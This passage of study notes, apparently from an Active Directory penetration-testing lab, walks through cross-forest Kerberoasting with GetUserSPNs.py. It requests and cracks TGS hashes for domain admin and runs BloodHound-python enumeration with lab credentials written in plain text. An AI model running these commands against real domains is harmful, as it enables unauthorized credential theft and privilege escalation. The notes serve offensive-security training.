- done using `GetUserSPNs.py`
	- we need creds for a user that can authenticate into the other domain

### Get SPNs from Target Domain using GetUserSPNs.py
- `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
	- `-request` flag gives us the TGS ticket. 
	- `-outputfile <OUTPUT FILE>`
- `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
	- will return a hash
<br>
- Crack the hash and we have domain admin on the other domain (`FREIGHTLOGISTICS`)
- Also check if a similar account is present in the current domain with password re-use
- ![](/attachments/Pasted-image-20250302124031.png)

<hr>

## Hunting Foreign Group Membership with Bloodhound-python
- Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship
- ![](/attachments/Pasted-image-20250302124219.png)

### Bloodhound-python against INLANEFREIGHT.LOCAL
- `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`
- `zip -r ilfreight_bh.zip *.json` - zip the files
### Bloodhound-python against FREIGHTLOGISTICS.LOCAL
- Add to `/etc/resolv.conf` as above:
	- ![](/attachments/Pasted-image-20250302124412.png)
- `bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2`
### BloodHound GUI:
- add above zip files to GUI
- `Users with Foreign Domain Group Membership` in `Analysis` tab
	- select source domain `INLANEFREIGHT.LOCAL`
- 
